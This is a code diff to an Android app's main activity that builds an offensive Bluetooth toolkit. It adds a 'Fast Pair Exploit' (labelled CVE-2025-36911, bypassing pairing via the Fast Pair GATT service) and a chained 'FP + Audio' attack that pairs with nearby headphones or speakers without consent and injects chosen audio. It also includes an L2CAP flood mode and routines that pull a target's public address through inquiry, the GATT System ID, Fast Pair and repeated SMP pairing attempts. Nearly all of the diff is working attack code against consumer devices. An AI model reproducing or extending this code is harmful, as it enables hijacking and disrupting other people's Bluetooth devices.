@@ -97,8 +97,11 @@ import com.courierstack.security.bredr.BrEdrPairingMode
 import com.courierstack.gap.IDiscoveryListener
 import com.courierstack.gap.DiscoveredDevice
 import com.courierstack.gap.DeviceDiscovery
+import com.courierstack.gatt.GattCallback
 import com.courierstack.sdp.SdpManager
 import com.courierstack.security.le.ISmpListener
+import com.courierstack.security.le.SmpAuthReqProfile
+import com.courierstack.security.le.SmpAutoRetryPairing
 import com.courierstack.security.le.SmpConstants
 import com.courierstack.security.le.SmpManager
 import kotlinx.coroutines.CoroutineScope
@@ -222,7 +225,9 @@ object FileLogger {
 
 enum class AttackMethod(val title: String, val description: String, val color: Long) {
     METHOD_1("LE L2CAP Flood", "BLE ATT/SMP/L2CAP packet flood via HCI", 0xFFFF3131),
+    METHOD_FP("Fast Pair Exploit", "CVE-2025-36911 - Bypass pairing via Fast Pair GATT", 0xFFFF8C00),
     METHOD_5("Audio Inject", "Stream custom audio to paired device", 0xFF4CAF50),
+    METHOD_FP_AUDIO("FP + Audio", "Fast Pair exploit then inject audio", 0xFF9C27B0),
 }
 
 data class AttackStats(
@@ -245,6 +250,7 @@ class MainActivity : ComponentActivity() {
     private var gattManager: GattManager? = null
     private var avdtpManager: AvdtpManager? = null
     private var sbcCodec: SbcCodec? = null
+    private var fastPairExploit: FastPairExploit? = null
     private var sdpManager: SdpManager? = null
 
 
@@ -574,8 +580,8 @@ class MainActivity : ComponentActivity() {
                     onStartScan = { startScan() },
                     onStopScan = { stopScan() },
                     onDeviceClick = { device, method ->
-                        if (method == AttackMethod.METHOD_5) {
-                            pickAudioFile(device)
+                        if (method == AttackMethod.METHOD_5 || method == AttackMethod.METHOD_FP_AUDIO) {
+                            pickAudioFile(device, method)
                         } else {
                             startAttack(device, method)
                         }
@@ -702,6 +708,13 @@ class MainActivity : ComponentActivity() {
                 gattManager = GattManager(l2capManager!!, gattListener)
                 gattManager!!.initialize()
 
+                // Initialize Fast Pair exploit
+                withContext(Dispatchers.Main) {
+                    stackStatusMessages.add("Initializing Fast Pair exploit...")
+                }
+                fastPairExploit = FastPairExploit(l2capManager!!, gattManager!!, scannerManager!!) { msg ->
+                    FileLogger.i(TAG, "[FastPair] $msg")
+                }
 
                 withContext(Dispatchers.Main) {
                     stackStatusMessages.add("Initializing AVDTP manager...")
@@ -792,7 +805,27 @@ class MainActivity : ComponentActivity() {
         }
 
         scannedDevices.clear()
-        FileLogger.i(TAG, "Starting LE scan...")
+        // Use dual-mode scan to find both LE and BR/EDR addresses
+        // This is important for Audio Inject which needs BR/EDR public addresses
+        FileLogger.i(TAG, "Starting dual-mode scan (LE + BR/EDR inquiry)...")
+        FileLogger.i(TAG, "Tip: Put target device in PAIRING MODE for best results")
+        scannerManager?.startDualScan()
+        isScanning = true
+    }
+
+    private fun startLeScanOnly() {
+        if (!hasPermissions) {
+            FileLogger.w(TAG, "Cannot start scan - no permissions")
+            return
+        }
+
+        if (!stackInitialized || scannerManager == null) {
+            FileLogger.w(TAG, "Cannot start scan - stack not initialized")
+            return
+        }
+
+        scannedDevices.clear()
+        FileLogger.i(TAG, "Starting LE scan only...")
         scannerManager?.startLeScan()
         isScanning = true
     }
@@ -800,7 +833,7 @@ class MainActivity : ComponentActivity() {
     private fun stopScan() {
         scannerManager?.stopAllScans()
         isScanning = false
-        FileLogger.i(TAG, "LE scan stopped")
+        FileLogger.i(TAG, "Scan stopped")
     }
 
 
@@ -820,7 +853,9 @@ class MainActivity : ComponentActivity() {
         attackJob = CoroutineScope(Dispatchers.IO).launch {
             when (method) {
                 AttackMethod.METHOD_1 -> executeL2capFlood(device)
+                AttackMethod.METHOD_FP -> executeFastPairExploit(device)
                 AttackMethod.METHOD_5 -> executeAudioInject(device)
+                AttackMethod.METHOD_FP_AUDIO -> executeFastPairThenAudio(device)
             }
 
             withContext(Dispatchers.Main) {
@@ -1026,6 +1061,132 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    /**
+     * Execute Fast Pair exploit (CVE-2025-36911)
+     * Bypasses normal pairing by exploiting the Fast Pair GATT service
+     */
+    private suspend fun executeFastPairExploit(device: DiscoveredDevice) {
+        val exploit = fastPairExploit ?: run {
+            FileLogger.e(TAG, "FastPairExploit not initialized")
+            return
+        }
+        val l2cap = l2capManager ?: return
+
+        FileLogger.i(TAG, "Starting Fast Pair exploit on ${device.address}")
+        FileLogger.logSeparator(TAG, "FAST PAIR EXPLOIT")
+
+        val address = parseAddress(device.address)
+        val startTime = System.currentTimeMillis()
+
+        try {
+            // Execute the exploit
+            val result = exploit.exploit(
+                address = address,
+                addressType = device.addressType
+            )
+
+            // Log all steps
+            result.steps.forEach { step ->
+                FileLogger.i(TAG, "[FP Step] $step")
+            }
+
+            if (result.success) {
+                FileLogger.i(TAG, "Fast Pair exploit SUCCEEDED!")
+                FileLogger.i(TAG, "Pairing success: ${result.pairingSuccess}")
+                FileLogger.i(TAG, "Account key written: ${result.accountKeyWritten}")
+                result.publicAddressFound?.let {
+                    FileLogger.i(TAG, "Public address found: $it")
+                }
+
+                withContext(Dispatchers.Main) {
+                    attackStats = attackStats.copy(
+                        connections = 1,
+                        dataSent = result.steps.size.toLong()
+                    )
+                }
+            } else {
+                FileLogger.e(TAG, "Fast Pair exploit FAILED: ${result.errorMessage}")
+                withContext(Dispatchers.Main) {
+                    attackStats = attackStats.copy(failures = 1)
+                }
+            }
+
+        } catch (e: Exception) {
+            FileLogger.e(TAG, "Fast Pair exploit exception", e)
+            withContext(Dispatchers.Main) {
+                attackStats = attackStats.copy(failures = 1)
+            }
+        }
+
+        val elapsed = ((System.currentTimeMillis() - startTime) / 1000).toInt()
+        withContext(Dispatchers.Main) {
+            attackStats = attackStats.copy(elapsed = elapsed)
+        }
+
+        FileLogger.i(TAG, "Fast Pair exploit completed in ${elapsed}s")
+    }
+
+    /**
+     * Execute Fast Pair exploit then inject audio
+     * Complete attack chain: FP exploit -> BR/EDR bond -> AVDTP stream
+     */
+    private suspend fun executeFastPairThenAudio(device: DiscoveredDevice) {
+        val exploit = fastPairExploit ?: run {
+            FileLogger.e(TAG, "FastPairExploit not initialized")
+            return
+        }
+
+        FileLogger.i(TAG, "Starting Fast Pair + Audio attack on ${device.address}")
+        FileLogger.logSeparator(TAG, "FP + AUDIO ATTACK")
+
+        val bytes = audioBytes ?: run {
+            FileLogger.e(TAG, "No audio file loaded - select audio first")
+            return
+        }
+
+        val address = parseAddress(device.address)
+        val startTime = System.currentTimeMillis()
+
+        // Step 1: Execute Fast Pair exploit
+        FileLogger.i(TAG, "Step 1: Running Fast Pair exploit...")
+        val result = exploit.exploit(
+            address = address,
+            addressType = device.addressType
+        )
+
+        result.steps.forEach { step ->
+            FileLogger.d(TAG, "[FP] $step")
+        }
+
+        if (!result.success) {
+            FileLogger.e(TAG, "Fast Pair exploit failed: ${result.errorMessage}")
+            FileLogger.w(TAG, "Attempting audio injection anyway (may fail)...")
+        } else {
+            FileLogger.i(TAG, "Fast Pair exploit succeeded - device should trust us now")
+        }
+
+        // Step 2: Use the public address if we found one, otherwise use original
+        val targetAddress = if (result.publicAddressFound != null) {
+            FileLogger.i(TAG, "Using discovered public address: ${result.publicAddressFound}")
+            result.publicAddressFound
+        } else {
+            device.address
+        }
+
+        // Step 3: Now do audio injection with the (hopefully) paired device
+        FileLogger.i(TAG, "Step 2: Starting audio injection to $targetAddress...")
+
+        // Create a modified device with the target address
+        val targetDevice = DiscoveredDevice(targetAddress)
+        targetDevice.updateLe(device.name, device.rssi, 0, true) // Public address type
+
+        // Inject audio
+        executeAudioInject(targetDevice)
+
+        val elapsed = ((System.currentTimeMillis() - startTime) / 1000).toInt()
+        FileLogger.i(TAG, "FP + Audio attack completed in ${elapsed}s")
+    }
+
 
     private suspend fun executeAudioInject(device: DiscoveredDevice) {
         val l2cap = l2capManager ?: return
@@ -1046,82 +1207,61 @@ class MainActivity : ComponentActivity() {
         val failures = AtomicInteger(0)
         val startTime = System.currentTimeMillis()
 
-
-
         val isLeRandomAddress = device.addressType != 0 && !device.isBrEdr()
 
         FileLogger.d(TAG, "Device type: isLeRandom=$isLeRandomAddress, isBrEdr=${device.isBrEdr()}, addressType=${device.addressType}")
 
-
-
-        if (isLeRandomAddress && smp != null) {
+        if (isLeRandomAddress) {
+            FileLogger.i(TAG, "Device has LE random address - need to find BR/EDR public address")
 
             val deviceName = device.name
+
+            // Step 1: Check if we already have a BR/EDR entry for this device (from dual scan)
             if (!deviceName.isNullOrEmpty()) {
                 val matchingDualMode = scannedDevices.values.find {
                     it.name == deviceName && it.isBrEdr() && it.address != device.address
                 }
                 if (matchingDualMode != null) {
-                    FileLogger.i(TAG, "Found matching DUAL-MODE entry: ${matchingDualMode.address}")
-                    FileLogger.i(TAG, "Skipping SMP identity resolution, using BR/EDR address directly")
+                    FileLogger.i(TAG, "Found existing BR/EDR entry: ${matchingDualMode.address}")
                     targetAddress = matchingDualMode.address
                     address = parseAddress(targetAddress)
-                } else {
-                    FileLogger.i(TAG, "Device uses LE random address, attempting to resolve identity address via SMP...")
-
-
-                    courierStack?.hciManager?.let { hciManager ->
-                        try {
-                            val cancelCmd = HciCommands.leCreateConnectionCancel()
-                            hciManager.sendCommandSync(cancelCmd, 1000)
-                            delay(100)
-                        } catch (e: Exception) {
-                            FileLogger.w(TAG, "Failed to cancel pending LE connections: ${e.message}")
-                        }
-                    }
-
-
-                    val identityAddress = resolveIdentityAddressViaSmp(
-                        l2cap, smp, device.address, device.addressType, 20000
-                    )
-
-                    if (identityAddress != null) {
-                        targetAddress = identityAddress
-                        address = parseAddress(targetAddress)
-                        FileLogger.i(TAG, "Resolved Identity Address: $targetAddress")
-                    } else {
-                        FileLogger.w(TAG, "SMP identity resolution failed, will try BR/EDR with original address")
-
-                    }
                 }
-            } else {
+            }
 
-                FileLogger.i(TAG, "Device uses LE random address, attempting to resolve identity address via SMP...")
+            // Step 2: If no BR/EDR entry found, try BR/EDR inquiry scan
+            if (targetAddress == device.address && !deviceName.isNullOrEmpty()) {
+                FileLogger.i(TAG, "Trying BR/EDR inquiry to find public address...")
 
-                courierStack?.hciManager?.let { hciManager ->
-                    try {
-                        val cancelCmd = HciCommands.leCreateConnectionCancel()
-                        hciManager.sendCommandSync(cancelCmd, 1000)
-                        delay(100)
-                    } catch (e: Exception) {
-                        FileLogger.w(TAG, "Failed to cancel pending LE connections: ${e.message}")
-                    }
-                }
+                val brEdrAddress = findBrEdrAddressViaInquiry(deviceName, 12000)
 
-                val identityAddress = resolveIdentityAddressViaSmp(
-                    l2cap, smp, device.address, device.addressType, 20000
-                )
-
-                if (identityAddress != null) {
-                    targetAddress = identityAddress
+                if (brEdrAddress != null) {
+                    targetAddress = brEdrAddress
                     address = parseAddress(targetAddress)
-                    FileLogger.i(TAG, "Resolved Identity Address: $targetAddress")
-
-                    FileLogger.d(TAG, "Waiting for device to settle before BR/EDR connection...")
-                    delay(1000)
+                    FileLogger.i(TAG, "Found BR/EDR address via inquiry: $targetAddress")
                 } else {
-                    FileLogger.w(TAG, "SMP identity resolution failed, will try BR/EDR with original address")
+                    FileLogger.w(TAG, "BR/EDR inquiry did not find device")
                 }
+            }
+
+            // Step 3: If still no address, try GATT + SMP identity resolution
+            if (targetAddress == device.address) {
+                FileLogger.i(TAG, "Trying GATT + SMP identity resolution...")
+
+                val smpResolvedAddress = resolveIdentityAddress(device.address, device.addressType)
+                if (smpResolvedAddress != null && smpResolvedAddress != device.address) {
+                    targetAddress = smpResolvedAddress
+                    address = parseAddress(targetAddress)
+                    FileLogger.i(TAG, "Resolved identity address: $targetAddress")
+                } else {
+                    FileLogger.w(TAG, "GATT + SMP identity resolution failed")
+                }
+            }
+
+            // Final check
+            if (targetAddress == device.address) {
+                FileLogger.e(TAG, "WARNING: Could not resolve BR/EDR address!")
+                FileLogger.e(TAG, "BR/EDR connection will likely fail with LE random address")
+                FileLogger.e(TAG, "Tips: Put device in PAIRING MODE and try again, or use Dual Scan")
             }
         }
 
@@ -1516,27 +1656,130 @@ class MainActivity : ComponentActivity() {
     }
 
 
-    private suspend fun resolveIdentityAddressViaSmp(
-        l2cap: L2capManager,
-        smp: SmpManager,
+    /**
+     * Attempts to find the BR/EDR public address for a device via inquiry scan.
+     * Matches by device name since LE and BR/EDR addresses are different.
+     *
+     * @param deviceName The name of the device to search for
+     * @param timeoutMs How long to scan
+     * @return The BR/EDR public address, or null if not found
+     */
+    private suspend fun findBrEdrAddressViaInquiry(
+        deviceName: String,
+        timeoutMs: Long = 12000L
+    ): String? = withContext(Dispatchers.IO) {
+        val scanner = scannerManager ?: return@withContext null
+
+        if (deviceName.isBlank()) {
+            FileLogger.w(TAG, "Cannot search for BR/EDR address - device has no name")
+            return@withContext null
+        }
+
+        FileLogger.i(TAG, "Starting BR/EDR inquiry to find public address for '$deviceName'...")
+        FileLogger.i(TAG, "Make sure device is in discoverable/pairing mode!")
+
+        var foundAddress: String? = null
+        val inquiryLatch = java.util.concurrent.CountDownLatch(1)
+
+        val inquiryListener = object : IDiscoveryListener {
+            override fun onDeviceFound(device: DiscoveredDevice) {
+                // Match by name since addresses will be different
+                if (device.isBrEdr && device.name != null) {
+                    FileLogger.d(TAG, "Inquiry found: ${device.name} at ${device.address}")
+                    if (device.name.equals(deviceName, ignoreCase = true)) {
+                        FileLogger.i(TAG, "MATCH! Found BR/EDR address for '$deviceName': ${device.address}")
+                        foundAddress = device.address
+                        inquiryLatch.countDown()
+                    }
+                }
+            }
+
+            override fun onScanComplete() {
+                FileLogger.d(TAG, "BR/EDR inquiry complete")
+                inquiryLatch.countDown()
+            }
+
+            override fun onScanStateChanged(scanning: Boolean) {
+                FileLogger.d(TAG, "Inquiry scan state: $scanning")
+            }
+
+            override fun onError(message: String) {
+                FileLogger.e(TAG, "Inquiry error: $message")
+                inquiryLatch.countDown()
+            }
+        }
+
+        scanner.addListener(inquiryListener)
+
+        try {
+            // Start BR/EDR inquiry
+            if (!scanner.startInquiry()) {
+                FileLogger.e(TAG, "Failed to start BR/EDR inquiry")
+                return@withContext null
+            }
+
+            // Wait for result or timeout
+            val found = inquiryLatch.await(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
+
+            // Stop inquiry
+            try {
+                scanner.stopInquiry()
+            } catch (e: Exception) {
+                FileLogger.w(TAG, "Error stopping inquiry: ${e.message}")
+            }
+
+            if (foundAddress != null) {
+                FileLogger.i(TAG, "Successfully found BR/EDR address: $foundAddress")
+            } else {
+                FileLogger.w(TAG, "Could not find BR/EDR address for '$deviceName' via inquiry")
+                FileLogger.w(TAG, "Device may not be in discoverable mode")
+            }
+
+            return@withContext foundAddress
+
+        } finally {
+            scanner.removeListener(inquiryListener)
+        }
+    }
+
+    /**
+     * Resolves a BLE random address to its identity (public) address.
+     *
+     * Strategy:
+     * 1. Connect via LE
+     * 2. Use GattManager to discover services and read System ID
+     * 3. Fall back to SMP if GATT fails
+     */
+    private suspend fun resolveIdentityAddress(
         leAddress: String,
         addressType: Int,
-        timeoutMs: Long
+        timeoutMs: Long = 30000L,
+        skipFastPair: Boolean = false
     ): String? = withContext(Dispatchers.IO) {
-        FileLogger.i(TAG, "Resolving Identity Address via LE SMP pairing...")
-        FileLogger.d(TAG, "Connecting to LE address: $leAddress (type=$addressType)")
+
+        val l2cap = l2capManager ?: return@withContext null
+        val gatt = gattManager ?: return@withContext null
+        val smp = smpManager
+
+        // If already public address, no resolution needed
+        if (addressType == 0) {
+            FileLogger.i(TAG, "Address $leAddress is already public, no resolution needed")
+            return@withContext leAddress
+        }
+
+        FileLogger.i(TAG, "Resolving identity address for $leAddress (type=$addressType)")
 
         val address = parseAddress(leAddress)
         var connectionHandle: Int? = null
         val connectionLatch = java.util.concurrent.CountDownLatch(1)
-
+        var connectionError: String? = null
 
         val l2capListener = object : IL2capListener {
             override fun onConnectionComplete(connection: AclConnection) {
                 if (connection.type == ConnectionType.LE) {
                     connectionHandle = connection.handle
+                    FileLogger.i(TAG, "LE connected for identity resolution, handle=0x${Integer.toHexString(connection.handle)}")
                     connectionLatch.countDown()
-                    FileLogger.i(TAG, "LE connected, handle=0x${Integer.toHexString(connection.handle)}")
                 }
             }
             override fun onDisconnectionComplete(handle: Int, reason: Int) {
@@ -1548,6 +1791,7 @@ class MainActivity : ComponentActivity() {
             override fun onDataReceived(channel: L2capChannel, data: ByteArray) {}
             override fun onError(message: String) {
                 FileLogger.e(TAG, "L2CAP error: $message")
+                connectionError = message
                 connectionLatch.countDown()
             }
             override fun onMessage(message: String) {}
@@ -1556,49 +1800,296 @@ class MainActivity : ComponentActivity() {
         l2cap.addListener(l2capListener)
 
         try {
-
+            // Create LE connection
             l2cap.createLeConnection(address, addressType, IL2capConnectionCallback.create(
                 { _ -> },
                 { reason ->
                     FileLogger.e(TAG, "LE connection failed: $reason")
+                    connectionError = reason
                     connectionLatch.countDown()
                 }
             ))
 
             val connected = connectionLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)
             if (!connected || connectionHandle == null) {
-                FileLogger.e(TAG, "Failed to establish LE connection for identity resolution")
+                FileLogger.e(TAG, "Failed to establish LE connection: ${connectionError ?: "timeout"}")
                 return@withContext null
             }
 
             val handle = connectionHandle!!
 
+            // =====================================================
+            // PHASE 1: Try GATT service discovery via GattManager
+            // =====================================================
+            FileLogger.i(TAG, "Phase 1: GATT service discovery...")
 
+            var resolvedAddress: String? = null
+            val gattLatch = java.util.concurrent.CountDownLatch(1)
+            var gattServices: List<GattService>? = null
 
-            smp.setDefaultAuthReq(
-                SmpConstants.AUTH_REQ_BONDING or SmpConstants.AUTH_REQ_MITM
+            val discoveryCallback = GattCallback.Discovery.create(
+                { services ->
+                    FileLogger.i(TAG, "GATT discovered ${services?.size ?: 0} services")
+                    gattServices = services
+                    gattLatch.countDown()
+                },
+                { errorCode, message ->
+                    FileLogger.w(TAG, "GATT discovery error: $errorCode - $message")
+                    gattLatch.countDown()
+                }
             )
 
+            gatt.discoverServices(handle, discoveryCallback)
 
-            FileLogger.i(TAG, "Initiating SMP pairing to get Identity Address...")
-            val pairingSuccess = smp.initiatePairingSync(handle, address, addressType, timeoutMs)
+            val gattComplete = gattLatch.await(15, java.util.concurrent.TimeUnit.SECONDS)
 
+            if (gattComplete && gattServices != null && gattServices!!.isNotEmpty()) {
+                FileLogger.i(TAG, "Found ${gattServices!!.size} GATT services")
 
-            delay(500)
+                for (service in gattServices!!) {
+                    FileLogger.d(TAG, "  Service: ${service.uuid}")
+                }
 
+                // Look for Device Information Service (0x180A) -> System ID
+                val deviceInfoService = gattServices!!.find {
+                    it.uuid.toString().uppercase().contains("180A")
+                }
 
-            val identityAddr = smp.getIdentityAddress(handle)
-            val identityType = smp.getIdentityAddressType(handle)
+                if (deviceInfoService != null) {
+                    FileLogger.i(TAG, "Found Device Information Service")
 
-
-            FileLogger.d(TAG, "Disconnecting LE connection (handle=0x${Integer.toHexString(handle)})...")
-            val disconnectLatch = java.util.concurrent.CountDownLatch(1)
-            val disconnectListener = object : IL2capListener {
-                override fun onDisconnectionComplete(h: Int, reason: Int) {
-                    if (h == handle) {
-                        FileLogger.d(TAG, "LE disconnect completed, reason=0x${Integer.toHexString(reason)}")
-                        disconnectLatch.countDown()
+                    // Look for System ID characteristic (0x2A23)
+                    val systemIdChar = deviceInfoService.characteristics.find {
+                        it.uuid.toString().uppercase().contains("2A23")
                     }
+
+                    if (systemIdChar != null) {
+                        FileLogger.i(TAG, "Found System ID characteristic, reading...")
+
+                        val readLatch = java.util.concurrent.CountDownLatch(1)
+                        var systemIdValue: ByteArray? = null
+
+                        val readCallback = GattCallback.Operation.create(
+                            { data ->
+                                systemIdValue = data
+                                readLatch.countDown()
+                            },
+                            { errorCode, message ->
+                                FileLogger.w(TAG, "System ID read error: $errorCode - $message")
+                                readLatch.countDown()
+                            }
+                        )
+
+                        gatt.readCharacteristic(handle, systemIdChar, readCallback)
+
+                        if (readLatch.await(5, java.util.concurrent.TimeUnit.SECONDS) && systemIdValue != null) {
+                            FileLogger.i(TAG, "System ID: ${systemIdValue!!.joinToString("") { "%02X".format(it) }}")
+
+                            // Extract BD_ADDR from System ID (format: OUI + FFFE + unique)
+                            resolvedAddress = extractAddressFromSystemId(systemIdValue!!)
+                            if (resolvedAddress != null) {
+                                FileLogger.i(TAG, "Extracted address from System ID: $resolvedAddress")
+                            }
+                        }
+                    }
+                }
+            } else {
+                FileLogger.w(TAG, "GATT discovery failed or no services found")
+            }
+
+            // If GATT found address, disconnect and return
+            if (resolvedAddress != null) {
+                disconnectLe(handle)
+                delay(300)
+                return@withContext resolvedAddress
+            }
+
+            // =====================================================
+            // PHASE 2: Try Fast Pair (GFPS) identity resolution
+            // Many audio devices (JBL, Sony, etc.) use LE only for
+            // Google Fast Pair service discovery. Their SMP is broken
+            // or incomplete. GFPS can provide the BR/EDR address
+            // directly without needing SMP pairing.
+            // =====================================================
+            val hasFastPairService = gattServices?.any {
+                it.uuid.toString().uppercase().contains("FE2C")
+            } == true
+
+            if (hasFastPairService && !skipFastPair) {
+                FileLogger.i(TAG, "Phase 2: Device has Fast Pair service (0xFE2C) - using GFPS for identity resolution")
+
+                // Disconnect the LE connection first since FastPairExploit manages its own
+                disconnectLe(handle)
+                delay(500)
+
+                val exploit = fastPairExploit
+                if (exploit != null) {
+                    try {
+                        val fpResult = exploit.exploit(
+                            address = address,
+                            addressType = addressType
+                        )
+
+                        fpResult.steps.forEach { step ->
+                            FileLogger.d(TAG, "[FP Identity] $step")
+                        }
+
+                        if (fpResult.publicAddressFound != null) {
+                            FileLogger.i(TAG, "Fast Pair resolved identity address: ${fpResult.publicAddressFound}")
+                            return@withContext fpResult.publicAddressFound
+                        } else {
+                            FileLogger.w(TAG, "Fast Pair exploit completed but no public address found")
+                        }
+                    } catch (e: Exception) {
+                        FileLogger.e(TAG, "Fast Pair identity resolution failed", e)
+                    }
+
+                    // Need to re-establish LE connection for SMP fallback
+                    FileLogger.d(TAG, "Re-establishing LE connection for SMP fallback...")
+                    val reconnLatch = java.util.concurrent.CountDownLatch(1)
+                    var reconnHandle: Int? = null
+                    var reconnError: String? = null
+
+                    // Use a dedicated listener for the reconnect so we don't rely on
+                    // the outer l2capListener (whose connectionLatch is already spent)
+                    val reconnListener = object : IL2capListener {
+                        override fun onConnectionComplete(connection: AclConnection) {
+                            if (connection.type == ConnectionType.LE) {
+                                reconnHandle = connection.handle
+                                FileLogger.d(TAG, "LE reconnected for SMP, handle=0x${Integer.toHexString(connection.handle)}")
+                                reconnLatch.countDown()
+                            }
+                        }
+                        override fun onDisconnectionComplete(h: Int, reason: Int) {}
+                        override fun onChannelOpened(channel: L2capChannel) {}
+                        override fun onChannelClosed(channel: L2capChannel) {}
+                        override fun onDataReceived(channel: L2capChannel, data: ByteArray) {}
+                        override fun onConnectionRequest(h: Int, psm: Int, sourceCid: Int) {}
+                        override fun onError(message: String) {
+                            reconnError = message
+                            reconnLatch.countDown()
+                        }
+                        override fun onMessage(message: String) {}
+                    }
+
+                    l2cap.addListener(reconnListener)
+                    try {
+                        l2cap.createLeConnection(address, addressType, IL2capConnectionCallback.create(
+                            { _ -> }, // Connection event handled by reconnListener above
+                            { reason ->
+                                reconnError = reason
+                                reconnLatch.countDown()
+                            }
+                        ))
+
+                        val reconnected = reconnLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)
+                        if (reconnected && reconnHandle != null) {
+                            connectionHandle = reconnHandle
+                        } else {
+                            FileLogger.w(TAG, "Could not reconnect LE for SMP fallback: ${reconnError ?: "timeout"}")
+                            // Clean up any connection that might have arrived late
+                            reconnHandle?.let { disconnectLe(it) }
+                            return@withContext null
+                        }
+                    } finally {
+                        l2cap.removeListener(reconnListener)
+                    }
+                } else {
+                    FileLogger.w(TAG, "FastPairExploit not initialized, skipping GFPS resolution")
+                }
+            } else if (hasFastPairService && skipFastPair) {
+                FileLogger.d(TAG, "Phase 2: Skipping Fast Pair (already attempted by caller)")
+            } else {
+                FileLogger.d(TAG, "Phase 2: No Fast Pair service found, skipping GFPS")
+            }
+
+            // =====================================================
+            // PHASE 3: Fall back to SMP pairing (last resort)
+            // NOTE: This will likely fail for audio devices with
+            // broken LE SMP (e.g. JBL Flip 7) but may work for
+            // other devices with proper SMP implementations.
+            // =====================================================
+            val currentHandle = connectionHandle ?: handle
+            if (smp != null) {
+                FileLogger.i(TAG, "Phase 3: Trying SMP pairing for identity resolution...")
+
+                val autoRetry = SmpAutoRetryPairing(smp)
+
+                autoRetry.setListener(object : SmpAutoRetryPairing.SimpleAutoRetryListener() {
+                    override fun onAttemptStarted(attemptNumber: Int, profile: SmpAuthReqProfile) {
+                        FileLogger.d(TAG, "SMP attempt $attemptNumber: ${profile.displayName}")
+                    }
+                    override fun onRetrying(attemptNumber: Int, failedProfile: SmpAuthReqProfile,
+                                            errorCode: Int, errorMessage: String?) {
+                        FileLogger.d(TAG, "SMP retry after ${failedProfile.displayName}: ${SmpConstants.getErrorString(errorCode)}")
+                    }
+                })
+
+                val result = autoRetry.pairWithAutoRetry(currentHandle, address, addressType, 60000)
+
+                if (result.isSuccess) {
+                    delay(500)
+                    val identityAddr = smp.getIdentityAddress(currentHandle)
+                    val identityType = smp.getIdentityAddressType(currentHandle)
+
+                    if (identityAddr != null && identityType == 0) {
+                        resolvedAddress = formatAddress(identityAddr)
+                        FileLogger.i(TAG, "Got identity address from SMP: $resolvedAddress")
+                    }
+                } else {
+                    FileLogger.w(TAG, "SMP pairing failed: ${result.lastErrorMessage}")
+                }
+            }
+
+            disconnectLe(currentHandle)
+            delay(300)
+
+            return@withContext resolvedAddress
+
+        } finally {
+            l2cap.removeListener(l2capListener)
+        }
+    }
+
+    private fun extractAddressFromSystemId(systemId: ByteArray): String? {
+        if (systemId.size < 8) return null
+
+        // System ID format (IEEE EUI-64): OUI (3 bytes) + FFFE + Unique (3 bytes)
+        // BD_ADDR is: OUI + Unique (without the FFFE in the middle)
+
+        FileLogger.d(TAG, "System ID bytes: ${systemId.joinToString("") { "%02X".format(it) }}")
+
+        // Check for FFFE pattern in middle (bytes 3-4)
+        if (systemId[3] == 0xFE.toByte() && systemId[4] == 0xFF.toByte()) {
+            // Standard format: extract OUI + Unique
+            val addr = ByteArray(6)
+            addr[0] = systemId[5]  // Unique part (reversed for display)
+            addr[1] = systemId[6]
+            addr[2] = systemId[7]
+            addr[3] = systemId[0]  // OUI part
+            addr[4] = systemId[1]
+            addr[5] = systemId[2]
+            return formatAddress(addr)
+        }
+
+        // Try alternate format: first 6 bytes directly
+        if (systemId.size >= 6) {
+            val addr = systemId.sliceArray(0..5)
+            // Reverse for standard MAC format
+            addr.reverse()
+            return formatAddress(addr)
+        }
+
+        return null
+    }
+
+    private suspend fun disconnectLe(handle: Int) {
+        val l2cap = l2capManager ?: return
+        try {
+            val disconnectLatch = java.util.concurrent.CountDownLatch(1)
+            val listener = object : IL2capListener {
+                override fun onDisconnectionComplete(h: Int, reason: Int) {
+                    if (h == handle) disconnectLatch.countDown()
                 }
                 override fun onConnectionComplete(connection: AclConnection) {}
                 override fun onChannelOpened(channel: L2capChannel) {}
@@ -1608,35 +2099,12 @@ class MainActivity : ComponentActivity() {
                 override fun onError(message: String) {}
                 override fun onMessage(message: String) {}
             }
-            l2cap.addListener(disconnectListener)
+            l2cap.addListener(listener)
             l2cap.disconnect(handle, 0x13)
-
-
-            val disconnected = disconnectLatch.await(3, java.util.concurrent.TimeUnit.SECONDS)
-            l2cap.removeListener(disconnectListener)
-
-            if (!disconnected) {
-                FileLogger.w(TAG, "LE disconnect timed out, proceeding anyway")
-            }
-
-
-            delay(500)
-
-            if (identityAddr != null && identityType == 0) {
-                val realAddr = formatAddress(identityAddr)
-                FileLogger.i(TAG, "Successfully resolved Identity Address: $realAddr")
-                return@withContext realAddr
-            } else if (identityAddr != null) {
-                FileLogger.w(TAG, "Got Identity Address but type=$identityType (need type=0 for BR/EDR)")
-            } else {
-                FileLogger.w(TAG, "Device did not send Identity Address (pairing=$pairingSuccess)")
-                FileLogger.w(TAG, "Device may not support Identity Address distribution")
-            }
-
-            return@withContext null
-
-        } finally {
-            l2cap.removeListener(l2capListener)
+            disconnectLatch.await(3, java.util.concurrent.TimeUnit.SECONDS)
+            l2cap.removeListener(listener)
+        } catch (e: Exception) {
+            FileLogger.w(TAG, "Disconnect error: ${e.message}")
         }
     }
 
@@ -1664,16 +2132,20 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    private fun pickAudioFile(device: DiscoveredDevice) {
+    private var pendingAudioMethod: AttackMethod? = null
+
+    private fun pickAudioFile(device: DiscoveredDevice, method: AttackMethod = AttackMethod.METHOD_5) {
         pendingAudioAttackDevice = device
+        pendingAudioMethod = method
         audioPickerLauncher.launch("audio/*")
     }
 
     private fun launchAudioAttack(device: DiscoveredDevice) {
-        FileLogger.i(TAG, "Starting audio attack with volume gain: ${audioVolumeGain}x")
+        val method = pendingAudioMethod ?: AttackMethod.METHOD_5
+        FileLogger.i(TAG, "Starting audio attack (${method.title}) with volume gain: ${audioVolumeGain}x")
         stopScan()
         attackTarget = device
-        attackMethod = AttackMethod.METHOD_5
+        attackMethod = method
         attackStats = AttackStats()
         isAttacking = true
         attackPaused = false
@@ -1681,7 +2153,10 @@ class MainActivity : ComponentActivity() {
         attackPausedFlag.set(false)
 
         attackJob = CoroutineScope(Dispatchers.IO).launch {
-            executeAudioInject(device)
+            when (method) {
+                AttackMethod.METHOD_FP_AUDIO -> executeFastPairThenAudio(device)
+                else -> executeAudioInject(device)
+            }
             withContext(Dispatchers.Main) {
                 isAttacking = false
                 attackTarget = null
